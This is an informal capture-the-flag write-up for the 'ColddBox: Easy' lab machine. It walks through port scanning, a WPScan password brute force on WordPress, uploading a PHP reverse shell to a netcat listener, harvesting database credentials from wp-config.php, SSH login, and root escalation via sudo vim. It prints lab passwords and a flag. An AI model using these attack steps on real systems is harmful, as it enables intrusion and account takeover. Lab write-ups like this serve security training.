**ColddBox: Easy**
*An easy level machine with multiple ways to escalate privileges. By Hixec.*

After running Nmap with the following command

`nmap -sC -sV -p- `

we get this:

`PORT     STATE SERVICE VERSION

ruuning ***Gobuster*** with this command :

`gobuster dir -u MACHINE_IP -w /usr/share/wordlists/FULL_PATH_TO_YOUR_WORDLIST`

will lead you into *`/wp-admin`*

let's run `WPScan` since it's a wordpress cms

`abdelhay@K4LI:/data/vpn$ wpscan --url http://MACHINE_IP/ -e u -P /usr/share/wordlists/rockyou.txt

and just like this we got **c0ldd's password : 9876543210**

get a reverseshell in 

`https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`

lunch a netcat listener with : 

`nc -nlvp 1234`

TCHA RAA!! we're www-data
stablish your shell with 

`python -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

let's check a very sensitive php file with :

`www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');`

let's use those creds for ssh connection
`abdelhay@K4ALI:/data/vpn$ ssh c0ldd@10.10.124.265 -p 4512
c0ldd@ColddBox-Easy:~$ cat user.txt 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==`

lets run   `sudo -l`

and we got 

`   (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp`


u can just run 

`sudo /usr/bin/vim`

and wirte this in

`:!/bin/bash`

and Congrats!! we're root now.

`c0ldd@ColddBox-Easy:~$  sudo /usr/bin/vim
